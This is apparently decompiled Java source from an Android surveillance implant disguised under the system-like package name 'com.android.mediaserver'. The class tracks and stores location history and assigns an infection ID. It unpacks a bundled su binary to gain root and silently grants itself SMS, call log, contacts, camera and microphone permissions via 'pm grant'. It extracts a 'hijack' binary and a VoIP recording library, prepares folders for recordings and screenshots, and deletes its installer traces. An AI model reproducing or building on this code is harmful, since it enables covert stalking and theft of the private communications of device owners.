package com.android.mediaserver;

import android.app.Application;
import android.content.IntentFilter;
import android.location.Location;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import com.activeandroid.ActiveAndroid;
import com.activeandroid.Configuration.Builder;
import com.android.mediaserver.config.Config;
import com.android.mediaserver.db.FetchedFileInfo;
import com.android.mediaserver.location.LocationHistoryManager;
import com.android.mediaserver.network.NetworkManager;
import com.android.mediaserver.receiver.ScreenStateReceiver;
import com.android.mediaserver.shell.Shell.SH;
import com.android.mediaserver.shell.Shell.SU;
import com.android.mediaserver.task.TaskStatusManager;
import com.android.mediaserver.util.AppUtils;
import com.android.mediaserver.util.ApplicationsManager;
import com.sromku.simple.storage.SimpleStorage;
import io.nlopez.smartlocation.OnLocationUpdatedListener;
import io.nlopez.smartlocation.SmartLocation;
import io.nlopez.smartlocation.SmartLocation.LocationControl;
import java.io.File;
import java.io.IOException;
import java.lang.Thread.UncaughtExceptionHandler;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import timber.log.Timber;
import timber.log.Timber.DebugTree;

public class MyApplication extends Application implements OnLocationUpdatedListener {
  public Object lockFramebuffer = new Object();
  private Config mConfig;
  private boolean mIsWorking;
  private Location mLocation;
  private LocationControl mLocationControl;
  private LocationHistoryManager mLocationHistoryManager;
  private ScreenStateReceiver mScreenStateReceiver;
  private UncaughtExceptionHandler mUnCaughtExceptionHandler;

  public void onCreate() {
    super.onCreate();
    initApp();
  }

  public void onTerminate() {
    super.onTerminate();
    try {
      unregisterReceivers();
    } catch (Exception e) {
      Timber.e(e, "Exception was thrown", new Object[0]);
    }
    try {
      mLocationControl.stop();
    } catch (Exception e2) {
      Timber.e(e2, "Exception was thrown", new Object[0]);
    }
  }

  public void onLocationUpdated(Location location) {
    Timber.e("Location: %s", AppUtils.locationStringFromLocation(location));
    mLocation = location;
    mLocationHistoryManager.saveLocation(location);
  }

  private void extractAssets() {
    try {
      String ldirName = "ldir_" + Build.CPU_ABI;
      String ldirPath = getFilesDir().getAbsolutePath() + File.separator + "ldir";
      AppUtils.extractAsset(getApplicationContext(), ldirName, ldirPath, false);
      SH.run("chmod 700 " + ldirPath);
      String filetreeName = "filetree_" + Build.CPU_ABI;
      String filetreePath = getFilesDir().getAbsolutePath() + File.separator + "filetree";
      AppUtils.extractAsset(getApplicationContext(), filetreeName, filetreePath, false);
      SH.run("chmod 700 " + filetreePath);
    } catch (Exception e) {
    }
    if (true == mConfig.getRecordVoip()) {
      try {
        String hijack = "hijack";
        String hijackPath = getFilesDir().getAbsolutePath() + File.separator + hijack;
        AppUtils.extractAsset(getApplicationContext(), hijack, hijackPath, false);
        SH.run("chmod 700 " + hijackPath);
        String libvoip = "libvoip.so";
        String libvoipPath = getFilesDir().getAbsolutePath() + File.separator + libvoip;
        AppUtils.extractAsset(getApplicationContext(), libvoip, libvoipPath, false);
        SH.run("chmod 700 " + libvoipPath);
      } catch (Exception e2) {
      }
    }
  }

  private void initApp() {
    mUnCaughtExceptionHandler = new UncaughtExceptionHandler() {
      public void uncaughtException(Thread thread, Throwable ex) {
        Timber.e(ex, "Uncaught exception", new Object[0]);
        System.exit(2);
      }
    };
    Thread.setDefaultUncaughtExceptionHandler(mUnCaughtExceptionHandler);
    mIsWorking = false;
    ActiveAndroid.initialize(new Builder(getApplicationContext()).setDatabaseName("backup.db")
        .addModelClass(FetchedFileInfo.class)
        .create());
    mScreenStateReceiver = new ScreenStateReceiver();
    registerReceivers();
    createSELinuxContextFile();
    copySu();
    mConfig = Config.getInstance(getApplicationContext());
    if (mConfig == null) {
      Log.d("MyApplication", "Uninstalling, Reason: Invalid configuration file");
      NetworkManager.getInstance(getApplicationContext()).notifyUninstall();
      ApplicationsManager.getInstance(getApplicationContext()).uninstallSelf();
    }
    if (mConfig.getUuid() == null || mConfig.getUuid().equals("")) {
      String address = ((WifiManager) getSystemService(WIFI_SERVICE)).getConnectionInfo().getMacAddress();
      if (address != null) {
        mConfig.setUuid(address.toLowerCase());
      } else {
        mConfig.setUuid(mConfig.getInfectionId());
      }
      try {
        mConfig.updateConfig(getApplicationContext());
      } catch (Exception e) {
        Timber.e(e, "Failed to update config", new Object[0]);
      }
    }
    TaskStatusManager.getInstance(getApplicationContext()).init();
    ApplicationsManager.getInstance(getApplicationContext()).uninstallParent();
    if ("Nexus S".equalsIgnoreCase(Build.MODEL)) {
      List removeFiles = new ArrayList();
      removeFiles.add("rm /data/local/tmp/bc.apk");
      removeFiles.add("rm /data/local/tmp/config.json");
      SH.run(removeFiles);
    }
    extractAssets();
    mLocationHistoryManager = LocationHistoryManager.getInstance(getApplicationContext());
    mLocationControl = SmartLocation.with(getApplicationContext()).location();
    mLocation = mLocationControl.getLastLocation();
    if (true == mConfig.getDebug()) {
      Timber.plant(new DebugTree());
    }
    Timber.d("Device ID for server: %s", mConfig.getUuid());
    try {
      SimpleStorage.getInternalStorage(getApplicationContext())
          .createDirectory(mConfig.getFilesDirectoryName());
      SimpleStorage.getInternalStorage(getApplicationContext())
          .createDirectory(mConfig.getUploadDirectoryName());
      SimpleStorage.getInternalStorage(getApplicationContext())
          .createDirectory(mConfig.getRecordingsDirectoryName());
      SimpleStorage.getInternalStorage(getApplicationContext())
          .createDirectory(mConfig.getMicRecordingsDirectoryName());
      SimpleStorage.getInternalStorage(getApplicationContext())
          .createDirectory(mConfig.getVoipRecordingsDirectoryName());
      SimpleStorage.getInternalStorage(getApplicationContext())
          .createDirectory(mConfig.getSnapshotsDirectoryName());
      SimpleStorage.getInternalStorage(getApplicationContext())
          .createDirectory(mConfig.getScreenshotsDirectoryName());
      SimpleStorage.getInternalStorage(getApplicationContext())
          .createDirectory(mConfig.getUserFilesDirectoryName());
    } catch (Exception e2) {
    }
    if (!AppUtils.isScreenOn(this)) {
      mLocationControl.start(this);
    }
    grantPermissions();
  }

  private void registerReceivers() {
    IntentFilter filter = new IntentFilter();
    filter.addAction("android.intent.action.SCREEN_ON");
    filter.addAction("android.intent.action.SCREEN_OFF");
    registerReceiver(mScreenStateReceiver, filter);
  }

  private void unregisterReceivers() {
    unregisterReceiver(mScreenStateReceiver);
  }

  public synchronized void startLocation() {
    if (true == mIsWorking) {
      try {
        Timber.d("Start location", new Object[0]);
        mLocationControl.start(this);
      } catch (Exception e) {
      }
    }
  }

  public synchronized void stopLocation() {
    try {
      Timber.d("Stop location", new Object[0]);
      mLocationControl.stop();
    } catch (Exception e) {
    }
  }

  public synchronized String getLocation() {
    String locationStringFromLocation;
    Location lastKnown = mLocationControl.getLastLocation();
    if (lastKnown != null) {
      locationStringFromLocation = AppUtils.locationStringFromLocation(lastKnown);
    } else if (mLocation != null) {
      locationStringFromLocation = AppUtils.locationStringFromLocation(mLocation);
    } else {
      locationStringFromLocation = "";
    }
    return locationStringFromLocation;
  }

  public synchronized void setIsWorking(boolean isWorking) {
    mIsWorking = isWorking;
  }

  private void grantPermissions() {
    List<String> permissions = new ArrayList(Arrays.asList(new String[] {
        "android.permission.READ_CALL_LOG", "android.permission.READ_SMS",
        "android.permission.READ_CONTACTS", "android.permission.READ_PHONE_STATE",
        "android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE",
        "android.permission.PROCESS_OUTGOING_CALLS", "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION", "android.permission.RECORD_AUDIO",
        "android.permission.CAMERA"
    }));
    List<String> permissionsToRequest = new ArrayList();
    for (String permission : permissions) {
      if (ContextCompat.checkSelfPermission(this, permission) != 0) {
        permissionsToRequest.add(permission);
      }
    }
    if (permissionsToRequest.size() != 0) {
      String cmdPrefix = "pm grant com.android.mediaserver ";
      for (String permission2 : permissionsToRequest) {
        SU.run(cmdPrefix + permission2);
      }
    }
  }

  private void copySu() {
    try {
      File zipFile = new File("/data/data/com.android.mediaserver/tr.apk");
      Timber.d("Unzipping " + zipFile.getAbsolutePath(), new Object[0]);
      AppUtils.unzip(zipFile, getFilesDir());
      SH.run("chmod -R 777 " + getFilesDir().getAbsolutePath());
      SH.run("chmod 777 /data/data/com.android.mediaserver/files/su");
    } catch (Exception e) {
      Timber.e(e, "Failed to unzip root files", new Object[0]);
    }
  }

  private void createSELinuxContextFile() {
    File file = new File(AppUtils.getSELinuxContextFilePath(getApplicationContext()));
    if (!file.exists()) {
      try {
        file.createNewFile();
      } catch (IOException e) {
        Timber.e(e, "Failed to create SELinux context file", new Object[0]);
      }
    }
  }
}
